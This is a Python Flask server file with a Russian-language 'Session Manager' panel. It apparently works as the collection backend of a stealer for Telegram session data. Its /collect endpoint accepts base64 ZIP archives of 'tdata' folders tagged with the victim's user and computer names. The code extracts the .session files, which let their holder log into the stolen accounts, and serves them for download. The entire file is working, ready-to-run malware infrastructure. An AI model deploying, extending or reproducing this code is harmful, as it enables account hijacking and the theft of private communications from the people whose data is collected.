import os
import json
import base64
import zipfile
import datetime
import shutil
from flask import Flask, request, jsonify, render_template_string, send_file, abort

app = Flask(__name__)

UPLOAD_DIR = "uploads"
SESSION_DIR = "sessions"
os.makedirs(UPLOAD_DIR, exist_ok=True)
os.makedirs(SESSION_DIR, exist_ok=True)

HTML_INDEX = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Session Manager</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .tabs { display: flex; gap: 10px; margin-bottom: 20px; }
        .tab-btn { padding: 8px 20px; cursor: pointer; background: #eee; border: 1px solid #ccc; border-radius: 4px; }
        .tab-btn.active { background: #0066cc; color: white; border-color: #0066cc; }
        .tab-content { display: none; }
        .tab-content.active { display: block; }
        table { border-collapse: collapse; width: 100%; }
        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
        th { background-color: #f2f2f2; }
        .clickable { cursor: pointer; }
        .clickable:hover { background-color: #f5f5f5; }
        .modal {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 0; top: 0;
            width: 100%; height: 100%;
            background: rgba(0,0,0,0.5);
        }
        .modal-content {
            background: white;
            margin: 10% auto;
            padding: 20px;
            width: 400px;
            border-radius: 8px;
            position: relative;
            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
        }
        .modal-close {
            position: absolute;
            top: 10px;
            right: 15px;
            font-size: 24px;
            cursor: pointer;
        }
        .modal-btn {
            display: inline-block;
            margin-top: 15px;
            padding: 8px 20px;
            background: #0066cc;
            color: white;
            border: none;
            border-radius: 4px;
            text-decoration: none;
            cursor: pointer;
        }
        .modal-btn:hover { background: #0055aa; }
        .info-row { margin: 8px 0; }
    </style>
</head>
<body>
    <h1>📁 Управление сессиями</h1>
    <div class="tabs">
        <button class="tab-btn active" data-tab="tab-uploads">ОСНОВНЫЕ</button>
        <button class="tab-btn" data-tab="tab-sessions">СЕССИИ</button>
    </div>

    <div id="tab-uploads" class="tab-content active">
        <h2>ZIP-архивы (tdata)</h2>
        {% if uploads %}
        <table>
            <tr><th>Имя</th><th>Размер</th><th>Дата</th><th></th></tr>
            {% for f in uploads %}
            <tr class="clickable" data-name="{{ f.name }}" data-size="{{ f.size }}" data-date="{{ f.date }}" data-dl="{{ url_for('download_upload', filename=f.name) }}">
                <td>{{ f.name }}</td>
                <td>{{ f.size }}</td>
                <td>{{ f.date }}</td>
                <td><button onclick="event.stopPropagation(); openModal(this.parentElement.parentElement)">📄</button></td>
            </tr>
            {% endfor %}
        </table>
        {% else %}<p>Нет архивов.</p>{% endif %}
    </div>

    <div id="tab-sessions" class="tab-content">
        <h2>.session файлы</h2>
        {% if sessions %}
        <table>
            <tr><th>Имя</th><th>Размер</th><th>Дата</th><th></th></tr>
            {% for f in sessions %}
            <tr class="clickable" data-name="{{ f.name }}" data-size="{{ f.size }}" data-date="{{ f.date }}" data-dl="{{ url_for('download_session', filename=f.name) }}">
                <td>{{ f.name }}</td>
                <td>{{ f.size }}</td>
                <td>{{ f.date }}</td>
                <td><button onclick="event.stopPropagation(); openModal(this.parentElement.parentElement)">📄</button></td>
            </tr>
            {% endfor %}
        </table>
        {% else %}<p>Нет извлечённых сессий.</p>{% endif %}
    </div>

    <!-- Модальное окно -->
    <div id="modal" class="modal" onclick="if(event.target===this) closeModal()">
        <div class="modal-content">
            <span class="modal-close" onclick="closeModal()">&times;</span>
            <h2 id="modal-title">Информация о файле</h2>
            <div class="info-row"><strong>Имя:</strong> <span id="modal-name"></span></div>
            <div class="info-row"><strong>Размер:</strong> <span id="modal-size"></span> байт</div>
            <div class="info-row"><strong>Дата:</strong> <span id="modal-date"></span></div>
            <a id="modal-dl-btn" class="modal-btn" href="#" download>Скачать</a>
        </div>
    </div>

    <script>
        function openModal(tr) {
            const name = tr.dataset.name;
            const size = tr.dataset.size;
            const date = tr.dataset.date;
            const dl = tr.dataset.dl;

            document.getElementById('modal-name').textContent = name;
            document.getElementById('modal-size').textContent = size;
            document.getElementById('modal-date').textContent = date;
            document.getElementById('modal-dl-btn').href = dl;

            document.getElementById('modal').style.display = 'block';
        }

        function closeModal() {
            document.getElementById('modal').style.display = 'none';
        }

        // Закрытие по Escape
        document.addEventListener('keydown', function(e) {
            if (e.key === 'Escape') closeModal();
        });

        // Переключение вкладок
        document.querySelectorAll('.tab-btn').forEach(btn => {
            btn.addEventListener('click', function() {
                document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
                this.classList.add('active');
                document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
                document.getElementById(this.dataset.tab).classList.add('active');
            });
        });
    </script>
</body>
</html>
"""

def extract_sessions(zip_path, user, computer):
    extracted = []
    try:
        with zipfile.ZipFile(zip_path, 'r') as zf:
            for info in zf.infolist():
                if info.filename.lower().endswith('.session') and not info.is_dir():
                    data = zf.read(info.filename)
                    base = os.path.basename(info.filename)
                    safe_user = "".join(c for c in user if c.isalnum() or c in ('-','_')) or "unknown"
                    safe_comp = "".join(c for c in computer if c.isalnum() or c in ('-','_')) or "unknown"
                    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
                    new_name = f"{safe_user}_{safe_comp}_{timestamp}_{base}"
                    dest = os.path.join(SESSION_DIR, new_name)
                    with open(dest, 'wb') as f:
                        f.write(data)
                    extracted.append(dest)
    except Exception as e:
        print(f"Extract error: {e}")
    return extracted

@app.route('/collect', methods=['POST'])
def collect():
    try:
        data = request.get_json()
        if not data:
            return jsonify({"status": "error", "message": "No JSON"}), 400

        required = ['user', 'computer', 'time', 'data']
        if not all(k in data for k in required):
            return jsonify({"status": "error", "message": "Missing fields"}), 400

        zip_b64 = data['data']
        try:
            zip_bytes = base64.b64decode(zip_b64)
        except Exception as e:
            return jsonify({"status": "error", "message": f"Invalid base64: {str(e)}"}), 400

        timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        safe_user = "".join(c for c in data['user'] if c.isalnum() or c in ('-','_')) or "unknown"
        safe_computer = "".join(c for c in data['computer'] if c.isalnum() or c in ('-','_')) or "unknown"
        filename = f"{safe_user}_{safe_computer}_{timestamp}.zip"
        filepath = os.path.join(UPLOAD_DIR, filename)

        with open(filepath, 'wb') as f:
            f.write(zip_bytes)

        extract_sessions(filepath, data['user'], data['computer'])

        return jsonify({"status": "success", "filename": filename}), 200

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

def list_files(dir_path, ext_filter=None):
    files = []
    for fname in os.listdir(dir_path):
        full = os.path.join(dir_path, fname)
        if os.path.isfile(full):
            if ext_filter and not fname.lower().endswith(ext_filter):
                continue
            stat = os.stat(full)
            files.append({
                'name': fname,
                'size': stat.st_size,
                'date': datetime.datetime.fromtimestamp(stat.st_mtime).strftime("%Y-%m-%d %H:%M:%S")
            })
    files.sort(key=lambda x: x['date'], reverse=True)
    return files

@app.route('/')
def index():
    uploads = list_files(UPLOAD_DIR, '.zip')
    sessions = list_files(SESSION_DIR, '.session')
    return render_template_string(HTML_INDEX, uploads=uploads, sessions=sessions)

@app.route('/download/upload/<filename>')
def download_upload(filename):
    safe_path = os.path.join(UPLOAD_DIR, filename)
    if not os.path.exists(safe_path):
        abort(404)
    if not os.path.realpath(safe_path).startswith(os.path.realpath(UPLOAD_DIR)):
        abort(403)
    return send_file(safe_path, as_attachment=True)

@app.route('/download/session/<filename>')
def download_session(filename):
    safe_path = os.path.join(SESSION_DIR, filename)
    if not os.path.exists(safe_path):
        abort(404)
    if not os.path.realpath(safe_path).startswith(os.path.realpath(SESSION_DIR)):
        abort(403)
    return send_file(safe_path, as_attachment=True)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)